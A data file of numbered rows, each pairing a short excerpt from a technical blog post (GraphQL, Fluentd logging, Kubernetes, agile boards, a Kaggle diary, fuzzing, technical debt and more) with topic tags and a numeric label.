935,"Awesome Schema and Type system Graph QL comes with an SDL ( Schema Definition Language ) which allows you to design your data models with great ease. Also, the SDL has a very strong type system, thus you can have static type checking for your schema. Compare this to the RESTs JSON world where you dont have any kind of schema or type checks. Better API versioning In the REST world, whenever theres a new requirement which requires a breaking change in the current API, we just create a new version of the API. Weve all seen version hell ( v1, v2, v3, v-final, ). But Graph QL takes a whole different approach to API versioning, with not supporting versioning at all. Since Graph QL only returns the data thats explicitly requested, so new capabilities can be added via new types and new fields on those types without creating a breaking change.","['GraphQL', 'Restvsgraphql', 'Js', 'Query', 'React']",8
936,"Imagine you have an app and it exchanges data with external providers. Everything is fine but sometimes there are issues, from your or their side and you need to know what data you sent and what theyrequest. Then you googled and realized you need to have an access log, five minutes later you are including slf4j + logback/ log4j2 and writing to a file in your server. Your app starts getting hits and your only-one-node cluster becomes a ten-nodes-hulkbuster cluster. Now, every time you need to look for a request, you need to do it in every node, Douch!. Thats when you realized you need to centralize your logs and there is where this article comes to help you.","['Java', 'Logging', 'Fluentd', 'Software Development', 'Distributed Systems']",11
937,"Fluency has lot of buffer style configs you need to tweak, they are well explained here. For this article, we will focus in tag, remote Host and __url__ is used to label events. We will use it to match our events in fluentd and be able to parse, filter and forward them to elasticsearch.remote Host is where events will be sent, in this case we are going to have a local fluentd so we use localhostport where fluentd is listeningencoder.pattern defines the layout of our events. It's the same as your log pattern, you can use placeholders but can not use MDC data until this commit is released. Here is an example how our event will look like: Let's configure local fluentd in order to chew our events and forward them to fluentd-aggregator. Config file (by default /etc/td-agent/td-agent.conf) should look like: Highlights: __url__ is the same port we have configured in __url__ to send logaccess events.filter and match tags have accesslog keyword. This is the tag i have mentioned before. We are using perfect matching, but there can be a regexmatch tag forwards our events to fluentd aggregator located in host elastic-node-00 and listening to port 24224filters are applied in sequential __url__ has a regex to parse our events. Group tags (like __url__ or request.method) will be used as json properties after filtering. For example, our sample event will look like this after each filter: This part is quite easy, we have to receive events and forward them to elasticsearch. Fluentd config file should look like: H __url__ is the same port we have configured above in match.server.portmatch.logstash_format generates an Elasticsearch index with format logstash-YYYY- __url__ indicates Elasticsearch API listening port Now you only have to enter to Kibana all your access log indexed Every access you had in you app its there and can be queried:)While I was configuring this stack I needed to know if my app was reporting, what format my events had, etc. Besides logging, tcpdump is a great tool to help you here.","['Java', 'Logging', 'Fluentd', 'Software Development', 'Distributed Systems']",15
938,"For example, in case you want to know what happened between your app and local fluentd, you can do something like this to start printing all messages going to port 20001Interested in other data sources and output destinations? Do you want to post your events to more than one data source? Check out the following resources: Fluentd Data Sources Fluentd Data Outputs For this articles simplicity, all application nodes report to a single instance of Elasticsearch. This is not recommendable as it is a SPOF (Single Point Of Failure). In production you should have an Elasticsearch cluster, each one having a fluentd aggregator. Fluentd output plugins allows you to have multiple servers with active/standby mode, you can check it out here.","['Java', 'Logging', 'Fluentd', 'Software Development', 'Distributed Systems']",11
939,"For the sake of this post, lets think about the simplest protocol that synchronously saves a username to a database and returns a boolean to inform if a procedure succeeded or not. Its mock would look like that: For a function add User, we introduced a variable add User Actiona function that is evaluated every time add User is called. Then, in a test scenario you can 1) verify that your system under test (testing code) indeed called that function and 2) emulate how database reacts (whether return true or false): By the way, if you dont like optionality of add User Action property you may continue with an equivalent implementation: In the stub presented above, we had to explicitly provide a type of add User Action variable. For short functions, it seems to be an easy task but for ones that involve several arguments, closures, (re)throws, @autoclosure it may end up with a fight between you and the compiler. To overcome such burdensomeness, we can leverage Swifts type inference system. The solution involves a global function that returns nil value of the same type as an argument: At first, it looks like a nonsense function but we will use it only to pull out T type, not its value.","['Swift', 'Unit Testing', 'iOS App Development', 'iOS', 'Tdd']",15
940,"If I gave you a sheet full of 1s and 0s could you tell me what it means/does? If you were to go to a country youve never been to that speaks a language youve never heard, or maybe your heard of it but dont actually speak it, what would you need while there to help you communicate with the locals? Your operating system functions as that translator in your PC. It converts those 1s and 0s, yes/no, on/off values into a readable language that you will understand. It does all of this in a streamlined graphical user interface, or GUI, that you can move around with a mouse click things, move them, see them happening before your eyes.","['Software Development', 'Computer Science', 'Cloud Computing', 'Distributed Systems']",3
941,"When you write a program and it runs too slow, but you see nothing wrong with your code, where else will you look for a solution. How will you be able to debug the problem if you dont know how the operating system works? Are you accessing too many files? Running out of memory and swap is in high usage? But you dont even know what swap is! And you want to communicate with another machine. How do you do that locally or over the internet? Why do some programmers prefer one OS over another? In an attempt to be a serious developer, I recently took Georgia Techs course Introduction to Operating Systems. It teaches the basic OS abstractions, mechanisms, and their implementations. The core of the course contains concurrent programming (threads and synchronization), inter-process communication, and an introduction to distributed OSs. I want to use this post to share my takeaways from the course, that is the 10 critical operating system concepts that you need to learn if you want to get good at developing software.","['Software Development', 'Computer Science', 'Cloud Computing', 'Distributed Systems']",9
942,"But first, lets define what an operating system is. An Operating System (OS) is a collection of software that manages computer hardware and provides services for programs. Specifically, it hides hardware complexity, manages computational resources, and provides isolation and protection. Most importantly, it directly has privilege access to the underlying hardware. Major components of an OS are file system, scheduler, and device driver. You probably have used both Desktop (Windows, Mac, Linux) and Embedded (Android, i OS) operating systems before.","['Software Development', 'Computer Science', 'Cloud Computing', 'Distributed Systems']",16
943,"Not Running: Processes that are not running are kept in queue, waiting for their turn to execute. Each entry in the queue is a pointer to a particular process. Queue is implemented by using linked list. Use of dispatcher is as follows. When a process is interrupted, that process is transferred in the waiting queue. If the process has completed or aborted, the process is discarded. In either case, the dispatcher then selects a process from the queue to execute.","['Software Development', 'Computer Science', 'Cloud Computing', 'Distributed Systems']",3
944,"A process can be of 2 types: Independent process and Co-operating process. An independent process is not affected by the execution of other processes while a co-operating process can be affected by other executing processes. Though one can think that those processes, which are running independently, will execute very efficiently but in practical, there are many situations when co-operative nature can be utilized for increasing computational speed, convenience and modularity. Inter-process communication (IPC) is a mechanism which allows processes to communicate each other and synchronize their actions. The communication between these processes can be seen as a method of co-operation between them. Processes can communicate with each other using these two ways: Shared Memory and Message Parsing.","['Software Development', 'Computer Science', 'Cloud Computing', 'Distributed Systems']",3
945,"There are two different ways that nodes can be informed of who owns what page: invalidation and broadcast. Invalidation is a method that invalidates a page when some process asks for write access to that page and becomes its new owner. This way the next time some other process tries to read or write to a copy of the page it thought it had, the page will not be available and the process will have to re-request access to that page. Broadcasting will automatically update all copies of a memory page when a process writes to it. This method is a lot less efficient more difficult to implement because a new value has to sent instead of an invalidation message.","['Software Development', 'Computer Science', 'Cloud Computing', 'Distributed Systems']",15
946,"At the same time Azure Functions give you more choices: you can deploy not only from ZIP packages, but also via version control systems, e.g. from Git Hub, Bit Bucket or an external repository of your choice. If you have that, you could, e.g. run tests via Git Hub web-hooks on pull requests, and the code would be deployed after merge. You can also deploy from a function-specific repository created by Azure automatically if you do not have any CI/CD in place yet. You should know that external version control systems are not available in certain regions, like Germany Northeast. On figure 1.2 you can observe an example of Azure Functions code deployment pipeline via integration with Git Hub.","['AWS', 'Azure', 'Cloud']",11
947,"Today there are many reasons to adopt open-source technology. Its still free: which means you can test and deploy without having to get budgetary sign-off. But its more than freemium: open source means eliminating vendor lock-in and instead being able to rely on a community for support. If there is a company sponsoring the project, even if that company goes under, you can continue to use the technology. (As one example, once Rethink DB the company shut down, the open-source project joined the Linux Foundation, and is enjoying a second life. )Open-source projects are cutting edge, and today many are also enterprise-ready, thanks in large part to its collaborative model. You can fix any bugs yourself. By contributing those fixes back to the main project, you can give back to and feel part of a community. Adopting open-source technology also helps with both hiring and personal development: engineers would rather learn a foundational technology than one vendors proprietary system.","['Open Source', 'Software', 'Software Development', 'Cloud Computing', 'Programming']",16
948,"This post was built on the shoulders of giants. A big thank you to all of the following people who have shared their open-source wisdom and time with myself and my co-founder Mike over the past few years: Harry Weller (RIP), Forest Baskett, Greg Papadopoulos, and the rest of the team at NEA; Peter Fenton, Chetan Puttagunta, and Eric Vishria and the rest of the team at Benchmark; Rob Bearden, Shaun Connolly, Herb Cunitz, Mitch Ferguson, Jeff Miller, and the rest of the Hortonworks diaspora; Gaurav Gupta from Elastic; Ion Stoica and Patrick Wendell from Databricks; Jay Kreps from Confluent; Spencer Kimball from Cockroach DB; and so many, many more. We are honored to have such great peers in our industry. (And another big thank you to everyone at Timescale DB for reviewing multiple drafts of this post! )About the authors: the team at Timescale are developers of Timescale DB, the first open-source time-series database to scale for fast ingest and complex queries while natively supporting full SQL. Because time is a critical dimension along which data is measured, Timescale DB enables developers and organizations to harness more of its power to analyze the past, understand the present, and predict the future. Timescale DB is deployed in production all around the world in a variety of industries including Telecom, Oil & Gas, Utilities, Manufacturing, Logistics, Retail, Media & Entertainment, and more. Based in New York and Stockholm, Timescale DB is backed by Benchmark Capital, New Enterprise Associates, Two Sigma Ventures, and other leading investors.","['Open Source', 'Software', 'Software Development', 'Cloud Computing', 'Programming']",16
949,"Despite experiencing these established benefits, we have seen bad habits emerge. Management pressure occasionally results in programmers working on both new enhancements and bug fixes concurrently. I find myself asking, is this the right approach? Context switching may feel like were being more productive. We do have several engineers that will commonly work on two tasks at once. Humans do like variation in their tasks. Working on several items provides a level of satisfaction.","['Agile', 'Kanban', 'Wip']",12
950,"With reliability of delivery starting to slip, action was needed to reduce the number of concurrent items on which individuals were working. At this point, it was imperative to introduce limits. Ideally, I would have preferred no more than one task assigned to any given developer at any one time. As our tools prevented this, I resorted to a simple task count on the development state. The team had concerns of such a low ceiling impacting release management items. So a compromise of two points was reached, and evaluated over several weeks.","['Agile', 'Kanban', 'Wip']",1
951,"Kubernetes supports multiple virtual clusters within the same physical cluster. These virtual clusters are called Namespaces. Namespaces are a way to divide cluster resources between multiple users. Many enterprises use Namespaces to divide the same physical Kubernetes cluster into different virtual software development environments as part of their overall Software Development Lifecycle (SDLC). This practice is commonly used in lower environments or non-prod (not Production) environments. These environments commonly include Continous Integration and Delivery (CI/CD), Development, Integration, Testing/Quality Assurance (QA), User Acceptance Testing (UAT), Staging, Demo, and Hotfix. Namespaces provide a basic form of what is referred to as soft multi-tenancy.","['Istio', 'Kubernetes', 'Google Cloud Platform', 'Microservices', 'Cloud Native']",10
952,"In this brief post, we demonstrated how to create a GKE cluster with Istio 1.0.x, containing three virtual clusters, or Namespaces. Each Namespace represents an environment, which is part of an applications SDLC. We enforced HTTP over TLS (HTTPS) using a wildcard SSL/TLS certificate. We also enforced end-user authentication using JWT-based OAuth 2.0 with Auth0. Lastly, we provided user-friendly DNS routing to each environment, using Google Cloud DNS. Short of a fully managed API Gateway, like Apigee, and automating the execution of the scripts with Jenkins or Spinnaker, this cluster is ready to provide a functional path to Production for developing our Storefront API.","['Istio', 'Kubernetes', 'Google Cloud Platform', 'Microservices', 'Cloud Native']",11
953,"There is one golden prerequisite for Dependency Injection and that is, Separation of Concerns. Put simply, group logic in separable units, and let these units work together, without any of them knowing much about the implementation details of the other. OOP calls such units classes, and FP, functions. The point is, units isolate common logic. Lets add to this the requirement that no unit explicitly instantiates the units it works with (dependencies). Instead, dependencies are passed upon the unit (injected), usually, during its instantiation.","['Programming', 'Python', 'Dependency Injection', 'Design Patterns', 'Articles']",9
954,"There are many Python libraries, which already facilitate this process. Among those, I looked at python-dependency-injector, serum, and injector. I found injector to be closest to what I have come to know and use on Java Spring and Guice. It is not the least verbose, but it gets the job done. Lets see how it works: Lets take the two classes, I have created above: The only modification I made, was adding an explicit type hint to the Api dependency. This will be used by the library to determine the right object to pass at instantiation.","['Programming', 'Python', 'Dependency Injection', 'Design Patterns', 'Articles']",15
955,"The real benefit of having dependency modules, is when you have several of them, for running your app in different contexts. Lets create a version of our Api class for testing purposes: Assuming that there might be more classes wed like to mock, we create a separate dependency module for them: The real magic happens when creating the injector. You can have as many injectors as you have, and each injector instance can be supplied with as many dependency module configurations as you wish:resulting in: I will stop here. I hope, if not really having managed to convince you, to have given you a slightly different perspective on things. Inversion of Control Containers and the Dependency Injection pattern Pythonic Dependency Injection: A Practical Guide Sune Andreas Dybro Debel Medium Python 3 Patterns, Recipes and Idioms Python 3 Patterns, Recipes and Idioms Dependency injection and inversion of control in Python Dependency Injector 3.14.2 documentationalecthomas/injectorsuned/serumets-labs/python-dependency-injector Roberto Prevato/rodi.","['Programming', 'Python', 'Dependency Injection', 'Design Patterns', 'Articles']",18
956,"This post will be a departure from some of my earlier writings. The following represents a coding diary of sorts, sort of a stream of consciousness following the progression of a machine learning coding project which took place over the course of about three days of focus. The project was my first attempt at tackling the data wrangling, algorithmic coding, and processing of machine learning algorithms in response to a public competition for beginners offered through the website kaggle here. While Ill include all relevant (python) code and corresponding images of output, if anyone is interested in the full executable form Ive uploaded the jupyter notebook to github here, which as long as you have the correct libraries installed (such as Numpy, Pandas, Tensorflow, Keras, etc) can be run bug free. Note that medium doesnt always behave with python code as far as line breaks and wrapping around text which is obviously a big deal with python, bear in mind if you want to try any of this code yourself. Given that this was my first attempt at this kind of project (or of pretty much any coding project for that matter), it should be no surprise that some of the points dwelled on are fairly basicwhile this could prove beneficial to beginners looking for ideas of how to overcome similar obstacles, I would offer to those more knowledgeable that have tried to balance some of those beginner considerations with a few points advanced insights as have picked up of the course of literature review (and perhaps a few brief tangents). If your OS allows it I do recommend reading with the soundtrack (youtube video) playing in background for ambienceat least that is how it is intended to be read. Anyway here is my first Kaggle entry in its entirety.","['Machine Learning', 'Coding', 'Tutorial']",6
957,"At this stage in Titanic tutorial, author suggests dropping a few rows that might be populated with primarily missing cells and thus wont have much predictive power. Upon inspection in Rapidminer, the primary columns that have mostly NA values are Pool QC, Fence, and Misc Feature. However before blindly striking these columns, my thought is that at minimum the inclusion of a pool should have some measurable impact on a home price, and since this is a manageable three columns will quickly turn back to Rapidminer tool and view the distributions vs home price as described above. Here for instance is the distributions of categories under Pool QC column: Were the pool classification benign on house price, I would have expected a distribution comparable to NA with simply different magnitudes. But clearly Ex (exterior pool) increases a home value. I cant for the life of me imagine why, my father likes to say that a swimming pool is like a hole in the ground you dig in your back yard and then pour money intoand dont even get me started on a certain neighbor with a giant oak tree overhanging over that same money pit which somehow drops about three times its weight in leaves but I digress.","['Machine Learning', 'Coding', 'Tutorial']",8
958,"Ok reviewing the remaining data, note that this set still includes the textual classifications for Neighborhood, the encoded vectors are in a separate object celled nbrhd_cat_1hot. Im hoping the fact that is in separate object wont be an issue when it comes to training, will cross that bridge when we get there, for now Ill go ahead and delete the original Neighborhood column from the set. (before doing so will save the data to a separate list just in case we need it again at some point (fearing ominous foreshadowing here (*NFTF here, this fear was unfounded)). )A thought: Im maybe overcomplicating the onehot encoding by keeping it as a seperate set, perhaps its just as simple as adding these 26 columns to our training dataframe. While not sure if this will be a sparse representation memory-wise where computer only has to store values for cells with non-zero values, for datasets of our scale that would hardly be a concern, M chip or otherwise. So yeah after talking it through I think it is easier than had originally supposed. So here goes going to try and add these 26 columns to our dataframe.","['Machine Learning', 'Coding', 'Tutorial']",14
959,"So we have our training and validation data, now what do we do with it? This home price prediction question is a regression problem (not to be confused with a logistic regression problem which is in fact a poorly named type of classification problem but I digress). While in the first part of this notebook I kind of used a whole slew of different sources, tutorials, books, etc as reference, I suspect the source material for these training operations will be a bit more condensed. Chollet has a section in Deep Learning With Python devoted to sample Keras training code for not only this type of problem but also this specific application for predicting house prices (section 3.8)the primary difference between his example and what were trying to accomplish here is a) our 26 sparse columns and b) his example has less training data (which he addresses by turning to k-fold validation to make use of as much of the training data as he can). Although we have a little more data (around 1,400 samples vs I think he described as around 500), it still seems like would be good practice to attempt the k-fold approach. So even though one would think that starting our model with a k-fold validation technique would deviate from our stated intent of starting with a minimum viable model, the fact that we have sample code right on hand from the text suggests this might be the easier of two paths, so yeah the decision is to just jump straight into k-fold instead of developing simpler model to start.","['Machine Learning', 'Coding', 'Tutorial']",14
960,"Ok next were going to assemble code for hte K-fold approach to validation. For those less initiated k-fold is useful approach when have limited training data, which could cause our validation metric to be highly impacted by randomness of selection of data points. The k-fold approach splits the data into k sets, each with a mutually exclusive valdidation partition, training is performed simuilatneously on each of these folds with validation metric calculated, and then the valdidation metric accross the three sets is averaged to determine the overall validation metric for each epoch. Note that higher number of folds will increase our training time. Chollet used four folds for his 500 training data points, as we have around 1500 Ill arbitrarily bump up the number of folds to 5. We could increase this even more, have seen some suggest that even ten folds is not unusual, however that would also increase our training time so lets start small and see how it goes. (Thus the k number of folds could be another hyperparameter if we so desired).","['Machine Learning', 'Coding', 'Tutorial']",14
961,"For our next step, we can attempt to tune some hyperparameters, keeping in mind that there must be a balance between improving our models accuracy and preventing overfit. Most of the more advanced problems out in the wild will have a whole slew of parameters to deal with, one great thing about this simple problem is that the single hidden layer architecture and established industry norms for addressing regression problems means that we wont need to venture too far from our current model architecture. The text suggests playing with number of epochs and the size of the hidden layer. If we were feeling really adventurous we could experiment with some other features such as trying a different optimization algorithm (such as Adadelta), experimenting more with the number of k folds, add another hidden layer, or who knows maybe even incorproate dropout into the training (although truth be told Im not sure if thats appropriate for such a shallow model). For the more advanced problems there are even some tools out there to automate the hyperparameter exploration process. Chollet mentions a Python library called Hyperopt in the text which can explore feature spaces using Random Search or something called Tree of Parzen Estimators (you know a concept is on the cutting edge when there doesnt even exist a wikipedia entry for itwould someone mind getting on that? :)a Keras wrapper for this tool can be found on github here. There is even experimentation going on at Open AI to automate hyperparameter search using reinforcement learning algorithms! If our last derivation of Kaggle score is to be believed, this run would have taken us from around 1,000th place on the leaderboard to somewhere around 700th place. Which is nice I suppose, putting us around the midpoint of competitorsall without a GPU no less. A C is a passing grade after all! But figure Ive got two more runs in me before wrapping this up, and will try to use those to experiment with size of the hidden row. This last training run was enjoyableused the time to watch the movie Contact with Jodie Foster et al. Who knows maybe lurking somewhere in that cosmic background radiation there is an alien intelligence trying to be heard I bet it could place very high on the leaderboard! You know (spoiler alert) when that pod dropped through the $300B alien device it only lost communication for a fraction of a secondbut for Jodie something like 18 hours transpiredthat technology could come in really handy for shortening training time of deep networks! Anyway Ill throw together another training run now and let it run overnight.","['Machine Learning', 'Coding', 'Tutorial']",5
962,"Eureka, we have found an improvement to our validation metric from increasing our number of hidden layer units from 70 to 85. A reasonable next step would be to step up our number of units and try again (or even better pick some new random combination of perturbations within our hyperperameter search sphere rinse lather and repeat), reason was never my strong suit however so am going to consider this model official optimized. After all the goal was always minimal viable model to serve as a baseline for future iterations, and given expected leaderboard placement from this validation score I do consider this viable. Now we need to apply our trained model for feature extraction from our test set, at which point we can prep for and submit to Kaggle to get our score. The finnish line is right around the corner! So here well apply our trained model to our test set and generate predictions. Even though our trained final model is already available in memory, Ill go ahead and upload the trained model we saved after the last run for demonstration purposes. Note that we could upload any of the different saved models at this point, Ill stick to the final one since it gave the best validation metrics. Just because Im chicken and dont want to lose the trained model currently in memory in case of bug, am going to name the final model something different.","['Machine Learning', 'Coding', 'Tutorial']",14
963,"My first submission was a dud. My submission scored 0.26440, placing 1445 out of 1599 competitors. Given that I expected the error rate to fall somewhere around 13% based on comparing my validation score to the mean value in sale price column, my assumption is that Ive entered the dreaded overfit territorybut note am approaching the borders of my expertise at this point. The good news is we now have a baseline to evaluate futyure performance. The better news is that we have nowhere to go but up. So yeah here goes a few more.","['Machine Learning', 'Coding', 'Tutorial']",6
964,"Well this final attempt didnt help, so will have to revert to 85 units in hidden layer and 300 epochs as baseline. Current high score is 0.24734, 1429th place. This search process is not one where my limited experience will add much value, so instead will simply set this aside until have a GPU instance in hand and have figured out how to automate the hyperperameter search process. A job is only as easy as the tools you bring to bearwhy try to use a hammer when a screwdriver is needed know what I mean? This has been a fun experiment. Although still leaves a little to be desired from the leaderboard standpoint, at least a baseline is officially established! Will post this on github in case has potential to help any others get started with kaggle. This is an interesting time for this competition because parallel there is another more advanced version of this home price prediction regression problem going on in Kaggle with cash prizesso this set could be a warm-up for a real opportunity! Note that I occasionally blog in a creative capacity on medium but sometimes touch on areas of professional interest I wrote a bit about the emerging field of deep learning in a post if youd like to see more From the Diaries of John Henry. If you enjoyed or got any value from this writeup feel free to say hello, Im on twitter at @nict or for professional inquiries can be reached on linkedin. Books that were referenced here or otherwise inspired this post:(As an Amazon Associate I earn from qualifying purchases. )For further readings please check out my Table of Contents, Book Recommendations, and Music Recommendations.","['Machine Learning', 'Coding', 'Tutorial']",14
965,"Finally, as teams build any new product or customer solution, weve created a culture around constantly questioning whether new functionality can be built as reusable modules. We enable selected modules to be pushed back into our platform fabric using an innersource model for review and approval, to encourage seamless reuse later.2. Time-box research tasks In cases where a new component, a new technology, or a new adaptation of existing analytics research cannot be avoided, we start targeted and time-boxed proof of concepts early. Teams sometimes handle these investigations as a Sprint 0 before the development project officially kicks off, or where that is not possible, as spike stories added to the backlog. In either case, the key to success is in time-boxing the research efforts. The idea should not be to find the best possible solution ever, but to find the best possible solution for right now, based on what we know at this moment.3. While extensive automation gives the best chance of success for any agile project, it is a strict requirement for big data projects. Without automation, two weeks is simply not long enough to accommodate the extensive time that would be required for non-development activities like environment provisioning, verification of massive data, integration testing with extreme combinations, and tuning for performance at scale.","['Agile', 'Big Data', 'Analytics', 'Software Development', 'Engineering']",1
966,"Our continuous delivery triggers more extensive system testing aimed to address areas of focus such as performance tuning, scaling, sizing, security scans, and high availability testing. Testing big data analytics applications is an entire discipline by itself. For example, how do you automate verification of output when the answer is not definite, but instead precise enough, based on an approximation algorithm like probabilistic counting? This is an area we have spent a lot of time over the years, and still we are learning.4. Groom the backlogmercilessly While this sounds simple and obvious, of the entire list, this one is the most difficult to do well for big data applications. Good user stories are relatively easy to write, with ample examples available, for web applications. You can deliver incremental value by leaving certain features out, or even just disabled, in earlier releases. But how do you partially build and deliver a big data pipeline that provides no immediate value unless it is complete? How do you incrementally deliver analytics algorithms that will take more than a sprint to code and test? Weve made progress here, and we are starting to define our own set of good examples to share amongst teams, but good incremental user stories for big data applications are harder than we realized. However, the potential value of success in getting better at this should not be underestimatedthis is the single greatest contributor to the uncertainty in any sprint we start.","['Agile', 'Big Data', 'Analytics', 'Software Development', 'Engineering']",6
967,"Evolution is completely indifferent to the complexity obtained. A poisonous waterfowl mammal that is close to reptiles by a number of attributes. It has a developed electroreception, lays eggs, is completely deprived of teeth. Platypus is an excellent example of a designed system, where each subsequent change was intended to meet immediate needs instead of following a clearly structured long-term plan. Nevertheless, as we can see, platypuses live and feel quite good.","['Agile', 'Evolution', 'Project Management', 'Software Development', 'Agile Methodology']",5
968,"Evolution is not engaged in optimization. Ancient fish had a nerve connecting the brain with the gills. It passed by the heart, located at the bottom part of the fish, near the head. Then, after the consistent development of all animals, the neck appeared, and the heart got into the chest. Nature can not just take and rebuild nerves in a new, optimal way, therefore, in animals, this nerve moves from the head deep into the body, makes a loop around the aorta, and returns back into the neck to gills evolved into the vocal chords. As a result, the nerve makes a hefty detour due to backward compatibility with the architecture of prehistoric fish.","['Agile', 'Evolution', 'Project Management', 'Software Development', 'Agile Methodology']",5
969,"Lets imagine, that someone has a fatal hereditary disease that reveals itself in middle age. And, at first sight, struggle for life of this person is meaninglesshis or her survival and offspring guarantee the same problems in future generations. If we dig a little bit deeper, we can say: the very presence of descendants makes it clear that from the point of view of evolution this person is quite eligible. After all, if you can have offspring, do it. As a result, having minor for the main functionality flaws, the individual still remains competitive. An application that performs the primary function will remain competitive even in spite of the awful design or the leaky and inelegant extra functionality. And no Agile is a hindrance for that. Thoroughly distributing such an application on user devices, you can achieve that functionality will be copied by other applications. And then we will get pdf-format, Open Office and the super key in Ubuntu.","['Agile', 'Evolution', 'Project Management', 'Software Development', 'Agile Methodology']",12
970,"I fully expect an announcement from Microsoft in the coming months to confirm that Framework v4.8 will be the final release, and that from that point onward, the bulk of the development work will be on Core. Meaning that Core will get all of the new innovations etc moving forward. To be clear, this does NOT mean that framework will go away. It will continue to be supported, and will be as usable, performant, etc as it is now for many many years. There is no need to rush out and do a re-write of existing code. I do however believe that from this point onward Core should be the default choice for new applications.","['Dotnet', 'Programming', 'Dotnet Core', 'Csharp', 'Coding']",16
971,I did not give any thought to the fact that it is going to be running every 15 mins. Neither did I leave any space in the code for future enhancements. It was one SQL and one API format function and thats it. Few days later another request to push some more data came and I added some more joins in the SQL. Over the next few months this kept happening and I kept adding more and more to the SQL. Finally it had become a giant mess of joins and sub queries which ran every 15 mins.,"['Database', 'AWS', 'Sql']",8
972,"Fuzzing is the act of sending invalid, unexpected arbitrary code to an application and then examining the response to determine its efficiency. Its the combination of systematic and non-systematic approaches derived out of feeding random input and output testing. It adds an extra layer of proactive approach to the preexisting code review, penetration testing and debugging mechanisms. At times its also referred as Monkey or Random Testing. Fuzzing can be done by a using a software or even piece of randomization code written by the testers. Fuzzing helps in finding bugs in the code, detecting undefined behavior, testing against certain cases of denial of service (Do S), memory leak finding, detecting deadlocks in the code etc.","['Fuzzing', 'Software Development', 'Security', 'Testing']",3
973,"Lets recap what Microsoft did in the 80s and 90s. During that time, they managed to establish one of the most successful, value-creating platforms of all time. The DOS/Windows ecosystem generated hundreds of billions of dollars and made an awful lot of people very rich. It did this by creating a software layer that sat between desktop PC hardware and application software. This allowed independent software vendors to write applications that interacted with this intermediate layer, and freed them (mostly) from having to worry about the nuances and vagaries of the underlying hardware. We can argue about Microsofts design aesthetics, but what you cant argue is how successful this platform was in freeing developers to build application software, and the resultant value that was unlocked. Famously, Microsoft only captured a minority percentage (~30%) of the total value created by the platform, leaving the remainder to be captured by software vendors and service providers on their own. [ED: If this topic interests you, Ben Thompson at Stratechery has been writing some great stuff on this recently. ]About 10 years ago Apple repeated this miracle with the i Phone, but with a slightly different business model configuration that had them capturing a percentage of all of the value unlocked by the platform. They were able to do this because they locked down the way applications were distributed to users, as well as taking a slice of any monetisation that occurred inside apps. That this was possible at all is due in no small part to the attention paid by Apple to design, and the compelling user experience they created. However, the size of the prizethe i OS ecosystem has turned into the most successful and profitable product in historycomes down to a fundamental shift in end user control: from businesses buying enterprise software in the case of Microsoft, to consumers buying smartphones in the case of Apple.","['Braingasm', 'Serverless', 'Architecture', 'Tech', 'Programming']",16
974,"Its a benefit of electronic board use but also it is a flaw. Somehow, using electronic board you hide from the rest of the team the exact moment when you move some task into next column. That exact moment, when you do it at the physical board, you could inform the rest of the team that some part of work is done, some discussion could spark among your team mates or you could ask them if they think your part of work is done correctly. But that is not what happens when you move something on the electronic board. When you do move your task on itnothing happens, since usually no one is watching the board constantly. Sometimes a related message will be dispatched to your teams chat.","['Agile', 'Scrum']",0
975,"You might say: We detect the actual state of the task by the assignee! When it is assigned to Tomits in development, when assigned to Sarahin testing, and etc.! That makes your board even worse. Now it assumes that every person in your team has only one role: developer, tester or devops engineer. And that an external spectator of your board should keep in mind all the roles you got in the team. Any spectator ever looked on this board should be provided with explanation who does what. As if developer cant do the testing and deployment, or devops engineer cant do the coding.","['Agile', 'Scrum']",13
976,"Another way to add unnecessary complexity to you board is, when you have 3 columns board and you want to reflect the real progress of the task, which hands in In Progress, you could just start creating additional sub-tasks like Development, Testing, Deployment. Its not only overloads your board with unnecessary details, but also increases the possibility to mess up with your tasks completely. What if there are two sub-tasks Development and Testing are hanging together in In Progress? What is there is no Deployment sub-task? There are two types of complexity on your board. Either you got some complex rules with relatively simple board or you got a complex board with very simple rules. Of course, every boards design is a compromise between these two complexities, but you must remember that the more complex your rules aremore error prone your system would be. So, in order to reduce rules complexity you must increase complexity of your board.","['Agile', 'Scrum']",1
977,"Basically, when you start your project, you may have a very simple board, but as you go forward, this board will become more sophisticated and complex allowing you to visualize your items flow. As soon you realize there is a complex ruleyou unfold one column into several. Once the flow is visualized, a bottleneck (if there is any) is discovered, an underlying problem is addressed and resolved, the team is trained to handle it and the shortcut is automatedyou might want to fold these columns back into a single one. Just remember that your board is going through same evolutionary changes as your team, workflow and your product, so you have to adapt in to the current situation. Just remember my advise: rather build complex board with simple rules that simple board with complex rules.","['Agile', 'Scrum']",0
978,"For me personally, I have found the following actions to be effective:communicate clearly which part I have personally played in a project. Effective places to communicate this would be in 1-on-1 meetings or team __url__ sure management knows about any extra tasks that I do on my own initiativedont be an asshole to my colleagues. Obviously, we shouldnt be assholes to anyone anyway. Being an asshole to work colleagues will cause them to talk about us in negative light behind our __url__ performance review meetings, I ask for appraisals from the colleagues I directly work with. If you have done your job correctly, they will say good things about you. It is better for others to sing praises about you rather than tooting your own horn.","['Software Development', 'Software Engineering', 'Work', 'Careers', 'Programming']",0
979,"Lets create a model that represents our data behavior. As this is a classification problem (given some instances, we want to classify them based on their features and predict the digit they represent), we will call our component classifier and well choose a Support Vector Machine (SVM). There are many other classifiers in Sklearn, but this one will be enough for our use case. For further details on when to use certain components depending on the problem, you can follow the following cheat-sheet: Import the classifier class: Now create a new instance of the classifier: You must have noticed there are two parameters in the constructor called gamma and C. In machine learning, these parameters are called hyperparameters and theyre the ones in charge of parameterizing our learning or training process. Theyre useful to adjust our model to our dataset. Although in this example theyre hardcoded, theyre usually adjusted dynamically by training several times and testing the output model with a testing or validation dataset. One way for discovering the optimal values of hyperparameters are combining grid search with k-fold cross-validation.","['Machine Learning', 'Python', 'Scikit Learn', 'Data Science', 'Software Engineering']",14
980,"Like any debt, technical debt must be paid down. You inevitably reach the point where all the accumulated debt makes the entire system so complicated and so expensive to maintain that it falls out of date and eventually out of step with your business. It can slow you down at precisely the point that youre supposed to be powering ahead. The layers and layers of bandages put on top of each other over time might fall off all at once, revealing every open wound. You can wait until then to try to fix things, like the people who sold collateralized debt obligations (CDOs) and credit default swaps (CDSs).","['Software Development', 'Agile', 'Startup', 'Entrepreneurship', 'Product Management']",4
